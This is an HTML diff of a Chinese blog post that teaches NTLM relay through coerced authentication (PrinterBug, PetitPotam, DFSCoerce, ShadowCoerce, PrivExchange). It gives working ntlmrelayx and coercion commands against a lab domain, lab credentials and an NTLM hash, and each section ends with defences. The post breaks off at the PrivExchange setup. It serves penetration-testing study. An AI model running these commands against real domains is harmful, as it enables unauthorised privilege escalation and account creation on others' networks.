@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>域渗透 Relay - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='攻防, 内网渗透' />
+  <meta itemprop="name" content="域渗透 relay">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="1216">
+  <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/58/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="域渗透 relay">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="攻防">
+    <meta property="article:tag" content="内网渗透">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="域渗透 relay">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/58/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/55/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/63/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "域渗透 relay",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/58\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  1216 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/58\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">域渗透 Relay</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>域渗透 Relay</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1216 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><blockquote>
+<p>在早期的 SMB 重放攻击中, 允许将 Client 请求的数据包重放至 Client 本身, 这就造成了 <code>MS08-068</code> 漏洞, 但漏洞在 2008 R2 中已经被修复.</p>
+<p>NTLM Relay 分为三个部分：监听器设置、触发NTLM认证和中继后攻击，其中关于触发 NTLM 认证的方式可以分为诱导的方式（系统命令、PDF文件等）、欺骗的方式（LLMNR/NBNS）和强制等方式，而本文第二部分着重探讨强制触发认证的方式，包括五种：PrinterBug、PeitiPotam、DFSCoerce、ShadowCoerce、PrivExchange，最后介绍一款集成工具Coercer</p>
+</blockquote>
+<h5 id="ntlm-relay" class="heading-element"><span>0.0.0.1  NTLM Relay</span>
+  <a href="#ntlm-relay" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>NTLM Relay 基于 NTLM 协议，而 NTLM 认证信息作为”独立部分“会被嵌入到应用协议的数据包中，如SMB、HTTP、LDAP、MSSQL等。此外可以实现跨协议Relay，如通过某个协议（如HTTP）在另一个协议（如SMB）上转发LM或NTLM认证信息</p>
+<p>NTLM Relay Attack（NTLM中继攻击）指的是强制目标服务器、目标用户使用LM Hash、NTLM Hash对攻击者的服务器进行认证，攻击者将该认证中继至其他目标服务器中（域控等），根据目标域的防护等级可以在活动目录域中进行横向移动或权限提升</p>
+<h5 id="强制触发认证的五种方式" class="heading-element"><span>0.0.0.2  强制触发认证的五种方式</span>
+  <a href="#%e5%bc%ba%e5%88%b6%e8%a7%a6%e5%8f%91%e8%ae%a4%e8%af%81%e7%9a%84%e4%ba%94%e7%a7%8d%e6%96%b9%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="printerbug" class="heading-element"><span>0.0.0.2.1  PrinterBug</span>
+  <a href="#printerbug" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>MS-RPRN</p>
+<p>RpcRemoteFindFirstPrinterChangeNotificationEx()</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>通过触发 SpoolService 错误，强制目标通过 MS-RPRN RPC 接口向攻击者进行身份验证。
+MS-RPRN 协议中定义的 <code>RpcRemoteFindFirstPrinterChangeNotificationEx()</code> 方法允许域用户创建远程更改通知对象，该对象用于监视打印机对象的更改，并且在发生修改后会向打印客户端发送更改通知，这里的打印客户端指的就是攻击者的主机，用于接收目标发送的更改通知（NTLM 认证请求）</p>
+<p>简而言之，就是通过触发打印机错误实现强制NTLM认证。</p>
+<p>条件：</p>
+<ul>
+<li>打印服务开启 - spoolsv.exe</li>
+<li>拥有一个域用户凭据信息</li>
+</ul>
+<p>####### 攻击流程&amp;相关工具</p>
+<blockquote>
+<p>环境简介
+域名 - hack.lab
+域控 - DC01 - 20.20.20.5
+辅域 - F2016 - 20.20.20.6
+域主机 - USER01 - 20.20.20.10
+Kali - 20.20.20.100</p>
+</blockquote>
+<p>工具地址 - <a href="https://github.com/leechristensen/SpoolSample"target="_blank" rel="external nofollow noopener noreferrer">SpoolSample</a></p>
+<ol>
+<li>
+<p>开启监听器 ntlmrelay.py
+选择添加用户参数 &ndash;add-computer
+由于要中继到 ldaps 服务上，添加消除 mic 验证参数 &ndash;remove-mic（具体原理见后续文章）</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest$ --remove-mic</span></span></code></pre></div></li>
+<li>
+<p>使用 printerbug 漏洞利用工具
+printerbug.py 触发辅域控进行强制验证</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 printerbug.py hack.lab/spiderman:123.com@20.20.20.6 20.20.20.100</span></span></code></pre></div><p>PS：这里攻击辅域控是因为域控发起的验证不能中继回自身（相关细节见MS08-068），故这里对辅域控进行强制验证。</p>
+</li>
+</ol>
+<p>####### 防御措施</p>
+<ul>
+<li>非必要不启用 Print Spooler 服务</li>
+<li>限制出入站的 NTLM 认证</li>
+<li>打微软官方补丁</li>
+</ul>
+<h6 id="peitipotam" class="heading-element"><span>0.0.0.2.2  PeitiPotam</span>
+  <a href="#peitipotam" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>MS-EFSR</p>
+<p>\PIPE\lsarpc</p>
+<p>EfsRpcOpenFileRaw()</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>在微软加密文件系统远程协议（<code>Microsoft Encrypting File System Remote Protocol, MS-EFSRPC</code>）中，提供了 EfsRpcOpenFileRaw() 接口，该 API 用于维护和管理远程网络访问的加密对象。</p>
+<p>==攻击者使用 MS-EFSRPC 协议连接到服务器，通过修改EfsRpcOpenFileRaw() 中的 FileName 参数劫持认证会话，迫使服务器进行强制验证。==</p>
+<p>简而言之，劫持目标函数中的FileName参数触发强制认证。</p>
+<p>条件：</p>
+<ul>
+<li>目标支持 MS-EFSR 协议</li>
+<li>拥有一个域用户凭据信息</li>
+</ul>
+<p>####### 攻击流程&amp;相关工具</p>
+<p>工具地址 - <a href="https://github.com/topotam/PetitPotam"target="_blank" rel="external nofollow noopener noreferrer">PetitPotam</a></p>
+<p>实验测试：</p>
+<blockquote>
+<p>环境简介
+域名 - hack.lab
+域控 - DC01 - 20.20.20.5
+辅域 - F2016 - 20.20.20.6
+域主机 - USER01 - 20.20.20.10
+Kali - 20.20.20.100</p>
+</blockquote>
+<ol>
+<li>
+<p>启动监听器 ntlmrelay.py
+这里和上面一样，也是通过添加用户来验证 PeitiPotam 强制验证成功与否。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest01$ --remove-mic</span></span></code></pre></div></li>
+<li>
+<p>利用工具触发认证
+使用 PeitiPotam 利用工具进行强制触发认证，也是以辅域控为目标</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6
+</span></span><span style="display:flex;"><span>python3 PetitPotam.py -u <span style="color:#a6be9d">&#39;WIN19$&#39;</span> -hashes :2c05ad434d747b203a57565194891b38 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab DC01.xiaorang.lab</span></span></code></pre></div></li>
+</ol>
+<p>####### 防御措施</p>
+<ul>
+<li>删除不必要的角色服务</li>
+<li>限制出入站的 NTLM 认证</li>
+<li>打微软补丁</li>
+</ul>
+<h6 id="dfscoerce" class="heading-element"><span>0.0.0.2.3  DFSCoerce</span>
+  <a href="#dfscoerce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>CVE-2022-26925</p>
+<p>MS-DFSNM</p>
+<p>\pipe\netdfs</p>
+<p>NetrDfsRemoveStdRoot() - NetrDfsAddStdRoot()</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>在微软分布式文件系统命名空间管理协议<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979"target="_blank" rel="external nofollow noopener noreferrer">MS-DFSNM</a> 中，提供了一个管理DFS配置的RPC接口，该接口可通过 <code>\pipe\netdfs</code> SMB命名管道获得。</p>
+<p>攻击者使用 MS-EFSRPC 协议中的RPC接口来触发强制认证，目前发现的特定方法有两个：NetrDfsRemoveStdRoot() 和 NetrDfsAddStdRoot()</p>
+<p>条件</p>
+<ul>
+<li>域内启用 MS-DFSNM 协议</li>
+<li>拥有一个域用户凭据信息</li>
+<li>只对域控有效</li>
+</ul>
+<p>####### 攻击流程&amp;相关工具</p>
+<p>工具地址 - <a href="https://github.com/Wh04m1001/DFSCoerce"target="_blank" rel="external nofollow noopener noreferrer">DFSCoerce</a></p>
+<p>实验环境：</p>
+<blockquote>
+<p>环境简介
+域名 - hack.lab
+域控 - DC01 - 20.20.20.5
+辅域 - F2016 - 20.20.20.6
+域主机 - USER01 - 20.20.20.10
+Kali - 20.20.20.100</p>
+</blockquote>
+<ol>
+<li>
+<p>开启监听器 ntlmrelay.py
+通过添加用户来验证 PeitiPotam 强制验证成功与否。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest02$ --remove-mic
+</span></span><span style="display:flex;"><span>Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC$</span></span></code></pre></div></li>
+<li>
+<p>使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 dfscoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
+</span></span><span style="display:flex;"><span>python3 dfscoerce.py -u spiderman -hashes <span style="color:#a6be9d">&#34;xxx&#34;</span> -d hack.lab   监听ip   DC</span></span></code></pre></div></li>
+</ol>
+<p>####### 防御措施</p>
+<ul>
+<li>禁用已废弃的NTLM认证</li>
+<li>启用身份验证扩展保护 (EPA)、SMB 签名</li>
+<li>关闭 AD CS 服务器上的 HTTP 保护</li>
+<li>打微软补丁 CVE-2022-26925</li>
+</ul>
+<h6 id="shadowcoerce" class="heading-element"><span>0.0.0.2.4  ShadowCoerce</span>
+  <a href="#shadowcoerce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>CVE-2022-30154
+MS-FSRVP
+\pipe\FssagentRpc
+IsPathSupported() - IsPathShadowCopied()</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>MS-FSRVP 是微软的文件服务器远程VSS协议。用于在远程计算机上创建文件共享卷影副本，该协议提供的接口可通过 <code>\pipe\FssagentRpc</code> SMB命名管道获得。
+攻击者通过使用一种依赖于远程UNC路径的特定方法来实现强制验证 —— IsPathSupported() 和 IsPathShadowCopied()</p>
+<p>条件</p>
+<ul>
+<li>目标服务器安装了文件服务器VSS代理服务</li>
+<li>开启MS-FSRVP协议</li>
+<li>拥有一个域用户凭据信息</li>
+</ul>
+<p>实验环境配置</p>
+<p>实验环境：</p>
+<blockquote>
+<p>环境简介
+域名 - hack.lab
+域控 - DC01 - 20.20.20.5
+辅域 - F2016 - 20.20.20.6
+域主机 - USER01 - 20.20.20.10
+Kali - 20.20.20.100</p>
+</blockquote>
+<p>除此之外，需要在目标服务器上启用 文件服务器VSS代理服务</p>
+<p>####### 攻击流程&amp;相关工具</p>
+<p>工具地址 - <a href="https://github.com/ShutdownRepo/ShadowCoerce"target="_blank" rel="external nofollow noopener noreferrer">ShadowCoerce</a></p>
+<ol>
+<li>
+<p>开启监听器 ntlmrelayx ，这里也同样使用添加机器账户用于确认强制验证成功与否</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest03$ --remove-mic</span></span></code></pre></div></li>
+<li>
+<p>使用 shadowcoerce 脚本利用工具，触发强制验证</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 shadowcoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6</span></span></code></pre></div></li>
+</ol>
+<p>####### 防御措施</p>
+<ul>
+<li>限制出入站的 NTLM 认证</li>
+<li>使用认证的扩展保护（EPA）</li>
+<li>打补丁 CVE-2022-30154</li>
+</ul>
+<h6 id="privexchange" class="heading-element"><span>0.0.0.2.5  PrivExchange</span>
+  <a href="#privexchange" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 攻击原理</p>
+<p>在Exchange中，提供了网络服务API - PushSubscription，允许订阅推送通知。Exchange服务器在域中通常有很高的权限（WriteDacl，修改目标ACL的权限），是攻击的不戳目标。</p>
+<p>攻击者可以利用该API迫使Exchange服务器对指定目标进行强制认证。</p>
+<p>条件：</p>
+<ul>
+<li>目标为Exchange，且未打补丁</li>
+<li>拥有一个带有邮箱的域用户凭据信息</li>
+</ul>
+<p>####### 攻击流程&amp;相关工具</p>
+<p>工具地址 - <a href="https://github.com/dirkjanm/privexchange/"target="_blank" rel="external nofollow noopener noreferrer">PrivExchange</a></p>
+<p>实验测试：</p>
+<blockquote>
+<p>环境简介
+域名 - hack.lab
+域控 - DC01 - 20.20.20.5
+Exchange服务器 - E2016 - 20.20.20.7
+域主机 - USER01 - 20.20.20.10
+Kali - 20.20.20.100</p>
+</blockquote>
